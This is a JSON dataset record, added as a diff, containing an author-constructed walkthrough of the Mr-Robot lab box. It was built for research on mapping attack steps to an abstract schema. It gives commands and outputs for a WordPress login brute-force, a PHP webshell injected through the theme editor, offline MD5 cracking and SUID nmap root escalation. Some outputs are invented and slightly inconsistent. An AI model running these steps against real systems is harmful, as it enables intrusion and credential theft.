@@ -1,0 +1,185 @@
+{
+  "box": "Mr-Robot",
+  "source": "Representative walkthrough constructed from public Mr-Robot write-up structure (robots.txt wordlist -> WordPress weak-cred brute -> theme-editor webshell -> SUID nmap root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture.",
+  "abstract_family": "default_or_weak_password",
+  "vulnhub_correspondence": "robots.txt leaks fsocity.dic + key-1; /license base64 leaks WordPress creds (elliot); wpscan dictionary brute of wp-login succeeds; wp-admin theme editor injects PHP for a daemon webshell; /home/robot/key-2 gated by robot's MD5 (cracked offline); su robot; SUID nmap --interactive escalates to root; key-3.",
+  "target_label": "http://10.10.10.5",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan the target with nmap to enumerate open services and versions.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- 10.10.10.5",
+      "tool_output": "PORT    STATE  SERVICE  VERSION\n22/tcp  closed ssh\n80/tcp  open   http     Apache httpd\n443/tcp open   ssl/http Apache httpd",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:80", "https:443"], "tech_stack": ["apache"]}
+    },
+    {
+      "step": 1,
+      "phase": "enumeration",
+      "actor_intent": "Fingerprint the web technology stack to identify the CMS.",
+      "tool": "whatweb",
+      "tool_command": "whatweb http://10.10.10.5",
+      "tool_output": "http://10.10.10.5 [200 OK] Apache, HTTPServer[Apache], JQuery, MetaGenerator[WordPress 4.3.1], PoweredBy[WordPress], WordPress[4.3.1], X-Pingback[/xmlrpc.php]",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["apache", "wordpress"]}
+    },
+    {
+      "step": 2,
+      "phase": "enumeration",
+      "actor_intent": "Retrieve robots.txt to discover hidden or disallowed paths.",
+      "tool": "curl",
+      "tool_command": "curl -s http://10.10.10.5/robots.txt",
+      "tool_output": "User-agent: *\nfsocity.dic\nkey-1-of-3.txt",
+      "reference_abstract_action": "content_retrieval",
+      "path": "/robots.txt",
+      "reference_state_after": {"discovered_paths": ["/key-1-of-3.txt", "/fsocity.dic"]}
+    },
+    {
+      "step": 3,
+      "phase": "loot",
+      "actor_intent": "Read the first key file advertised in robots.txt.",
+      "tool": "curl",
+      "tool_command": "curl -s http://10.10.10.5/key-1-of-3.txt",
+      "tool_output": "073403c8a58a1f80d943455fb30724b9",
+      "reference_abstract_action": "sensitive_file_read",
+      "path": "/key-1-of-3.txt",
+      "file_id": "key_1",
+      "reference_state_after": {"read_files": ["key_1"]}
+    },
+    {
+      "step": 4,
+      "phase": "loot",
+      "actor_intent": "Fetch the /license page and decode the embedded base64 blob, which leaks WordPress credentials.",
+      "tool": "curl",
+      "tool_command": "curl -s http://10.10.10.5/license",
+      "tool_output": "<!-- do you want a password or something? -->\nZWxsaW90OkVSMjgtMDY1Mgo=\ndecoded: elliot:ER28-0652",
+      "reference_abstract_action": "content_retrieval",
+      "path": "/license",
+      "reference_state_after": {"credentials": ["cred:elliot:ER28-0652"]}
+    },
+    {
+      "step": 5,
+      "phase": "auth",
+      "actor_intent": "Brute-force the WordPress login form with the leaked username and dictionary.",
+      "tool": "login",
+      "tool_command": "wpscan --url http://10.10.10.5 --passwords fsocity.dic --usernames elliot",
+      "tool_output": "[SUCCESS] Login successful for elliot\nHTTP/1.1 302 Found\nSet-Cookie: wordpress_logged_in_abc=elliot%7C...; path=/\nLocation: /wp-admin/",
+      "reference_abstract_action": "auth_attempt",
+      "role": "admin",
+      "reference_state_after": {"auth_state": "admin"}
+    },
+    {
+      "step": 6,
+      "phase": "exploit",
+      "actor_intent": "Use the wp-admin theme editor to inject PHP into 404.php and obtain a webshell.",
+      "tool": "exploit",
+      "tool_command": "curl -b cookie 'http://10.10.10.5/wp-admin/theme-editor.php' --data 'newcontent=<?php system($_GET[c]);?>&file=404.php'",
+      "tool_output": "Theme file 404.php updated.\n[+] PHP injected; webshell live at /wp-content/themes/twentyfifteen/404.php\ncommand execution confirmed",
+      "reference_abstract_action": "exploit_attempt",
+      "vuln_id": "wp_theme_editor_rce",
+      "yields_shell": true,
+      "reference_state_after": {"verified_vulnerabilities": ["wp_theme_editor_rce"], "shell_state": "webshell"}
+    },
+    {
+      "step": 7,
+      "phase": "post-exploit",
+      "actor_intent": "Run id through the webshell to confirm command execution and identify the user.",
+      "tool": "command",
+      "tool_command": "curl 'http://10.10.10.5/wp-content/themes/twentyfifteen/404.php?c=id'",
+      "tool_output": "uid=1(daemon) gid=1(daemon) groups=1(daemon)\ndaemon",
+      "reference_abstract_action": "command_execution",
+      "reference_state_after": {"shell_state": "command_execution", "privilege_level": "web_user"},
+      "candidate_pool": [
+        "Run id through the webshell to confirm command execution and identify the user.",
+        "Brute-force the WordPress login that has already succeeded.",
+        "Fingerprint the HTTP server technology stack again.",
+        "Read the root flag despite having no root access yet."
+      ]
+    },
+    {
+      "step": 8,
+      "phase": "loot",
+      "actor_intent": "Read robot's MD5 password hash file found in the home directory.",
+      "tool": "fileread",
+      "tool_command": "cat /home/robot/password.raw-md5",
+      "tool_output": "robot:c3fcd3d76192e4007dfb496cca67e13b",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "robot_md5",
+      "reference_state_after": {"read_files": ["robot_md5"]}
+    },
+    {
+      "step": 9,
+      "phase": "out-of-band",
+      "actor_intent": "Crack robot's MD5 hash offline with john and the rockyou wordlist.",
+      "tool": "command",
+      "tool_command": "john --format=raw-md5 --wordlist=rockyou.txt robot.hash",
+      "tool_output": "Loaded 1 password hash (Raw-MD5)\nabcdefghijklmnopqrstuvwxyz (robot)\nSession completed",
+      "reference_abstract_action": "out_of_abstraction",
+      "out_of_abstraction_reason": "Offline hash cracking (john/hashcat against a leaked OS hash) is local cryptographic work with no HTTP request or web interaction; the 16-action web schema cannot represent it.",
+      "suggested_schema_extension": "offline_credential_cracking",
+      "reference_state_after": {}
+    },
+    {
+      "step": 10,
+      "phase": "pivot",
+      "actor_intent": "Switch to the robot Unix account over the local shell using the cracked password.",
+      "tool": "command",
+      "tool_command": "su robot",
+      "tool_output": "Password:\nrobot@linux:~$ whoami\nrobot",
+      "reference_abstract_action": "out_of_abstraction",
+      "out_of_abstraction_reason": "A local Unix account switch via su/PAM on an interactive shell is not a web-form or HTTP auth; the schema's auth_attempt/credential_use are web-context only.",
+      "suggested_schema_extension": "local_account_switch",
+      "reference_state_after": {}
+    },
+    {
+      "step": 11,
+      "phase": "loot",
+      "actor_intent": "Read the second key file now readable as robot.",
+      "tool": "fileread",
+      "tool_command": "cat /home/robot/key-2-of-3.txt",
+      "tool_output": "822c73956184f694993bede3eb39f959",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "key_2",
+      "reference_state_after": {"read_files": ["key_2"]}
+    },
+    {
+      "step": 12,
+      "phase": "privesc-recon",
+      "actor_intent": "Enumerate the filesystem for SUID binaries usable for escalation.",
+      "tool": "command",
+      "tool_command": "find / -perm -4000 -type f 2>/dev/null",
+      "tool_output": "/usr/local/bin/nmap\n/bin/ping\n/usr/bin/passwd",
+      "reference_abstract_action": "post_exploitation",
+      "reference_state_after": {}
+    },
+    {
+      "step": 13,
+      "phase": "privesc",
+      "actor_intent": "Escalate to root by abusing the SUID nmap interactive mode.",
+      "tool": "privesc",
+      "tool_command": "nmap --interactive\nnmap> !sh",
+      "tool_output": "Starting nmap V. 3.81 ( Interactive Mode )\n# id\nuid=1(daemon) gid=1(daemon) euid=0(root)\n# whoami\nroot",
+      "reference_abstract_action": "privilege_escalation",
+      "rooted": true,
+      "reference_state_after": {"privilege_level": "root"},
+      "candidate_pool": [
+        "Escalate to root by abusing the SUID nmap interactive mode.",
+        "Read the root key file before escalating privileges.",
+        "Brute-force the WordPress login again."
+      ]
+    },
+    {
+      "step": 14,
+      "phase": "loot",
+      "actor_intent": "Read the final root key file now that we are root.",
+      "tool": "fileread",
+      "tool_command": "cat /root/key-3-of-3.txt",
+      "tool_output": "04787ddef27c3dee1ee161b21670b4e4",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "key_3",
+      "reference_state_after": {"read_files": ["key_3"]}
+    }
+  ]
+}
